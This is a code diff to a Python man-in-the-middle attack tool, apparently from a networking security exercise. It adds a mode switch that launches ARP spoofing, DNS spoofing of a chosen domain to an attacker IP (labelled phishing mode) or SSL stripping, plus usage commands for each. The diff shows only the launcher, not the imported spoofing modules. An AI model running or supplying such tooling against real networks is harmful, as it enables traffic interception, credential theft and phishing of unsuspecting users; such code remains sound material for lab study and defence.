@@ -9,17 +9,30 @@ import dns
 import sslstrip
 
 def main():
-    parser = argparse.ArgumentParser(description="ARP, DNS Spoofing and SSL Stripping Tool. Victim and Gateway IPs required.")
+    parser = argparse.ArgumentParser(description="MITM Attack Tool: ARP, DNS Spoofing & SSL Stripping. Victim and Gateway IPs required.")
+    
+    # Required arguments
     parser.add_argument("--victim", required=True, help="IP address of the victim machine")
     parser.add_argument("--gateway", required=True, help="IP address of the gateway")
+
+    # Mode selector
+    parser.add_argument("--mode", required=True, choices=["arp", "dns", "ssl"], help="Attack mode: 'arp' for ARP Spoofing, 'dns' for DNS Spoofing, 'ssl' for SSL Stripping")
+
+    # Arguments based on mode
     parser.add_argument("--attacker", required=True, help="IP address of the attacker machine (for DNS spoofing)")
-    parser.add_argument("--target-domain", default="www.tue.nl", help="Domain to spoof (e.g., tue.nl)")
-    parser.add_argument("--sslstrip", action="store_true", help="Enable SSL stripping (monitors HTTP traffic)")
-    parser.add_argument("--interface", help="Network interface for SSL stripping")
+    parser.add_argument("--target-domain", default="www.tue.nl", help="Domain to spoof (for DNS spoofing). Default: www.tue.nl")
+    parser.add_argument("--interface", help="Network interface for SSL stripping e.g. ens33 (for SSL stripping)")
     args = parser.parse_args()
 
 
-    print("[+] Starting ARP Spoofing... Press CTRL+C to stop")
+    if args.mode == "dns" and not args.attacker:
+        print("[-] Attacker IP is required for DNS spoofing mode.")
+        sys.exit(1)
+    if args.mode == "ssl" and not args.interface:
+        print("[-] Network interface is required for SSL stripping mode.")
+        sys.exit(1)
+
+    print(f"[+] Starting attack in [{args.mode.upper()}]... Press CTRL+C to stop")
 
     try:
         
@@ -42,9 +55,24 @@ def main():
         )
         arp_thread.start()
 
+        
+        # ARP-Only mode
+        if args.mode == 'arp':
+            print("[+] Running in ARP-Only mode. Intercepting traffic without modification.")
+
+        # Start DNS Spoofing if enabled
+        elif args.mode == "dns":
+            print(f"[+] Starting DNS Spoofing for domain {args.target_domain} to {args.attacker}...")
+            dns_thread = threading.Thread(
+                target=dns.start_dns_spoof,
+                args=(args.victim, args.attacker, args.target_domain),
+                daemon=True
+            )
+            dns_thread.start()
+
         # Start SSL Stripping if enabled
-        if args.sslstrip:
-            print(f"[+] Starting SSL Stripping in monitoring mode...")
+        elif args.mode == "ssl":
+            print(f"[+] Starting SSL Stripping on {args.interface}...")
             sslstrip_thread = threading.Thread(
                 target=sslstrip.start_sslstrip_sniff,
                 args=(args.interface,),
@@ -52,8 +80,6 @@ def main():
             )
             sslstrip_thread.start()
 
-        # Keep running until interrupted
-        print("[+] Attack running. Press CTRL+C to stop.")
         while True:
             time.sleep(1)
 
@@ -66,5 +92,10 @@ if __name__ == "__main__":
 
 # USAGE EXAMPLE:
 # You need the victim IP, gateway IP, and attacker IP
-# The DNS spoofing will redirect requests for www.tue.nl to the attacker IP
-# sudo python3 main.py --victim 192.168.1.5 --gateway 192.168.1.1 --attacker 192.168.1.55 
+# The attack can be run in three modes: ARP Spoofing mode, Phising mode (DNS Spoofing), or MITM mode (SSL Stripping)
+# For ARP Spoofing mode:
+# sudo python3 main.py --mode arp --victim <VICTIM_IP> --gateway <GATEWAY_IP>
+# For Phising (DNS Spoofing) mode:
+# sudo python3 main.py --mode dns --victim <VICTIM_IP> --gateway <GATEWAY_IP> --attacker <ATTACKER_IP> --target-domain <TARGET_DOMAIN>
+# For MITM (SSL Stripping) mode:
+# sudo python3 main.py --mode ssl --victim <VICTIM_IP> --gateway <GATEWAY_IP> --interface <NETWORK_INTERFACE>
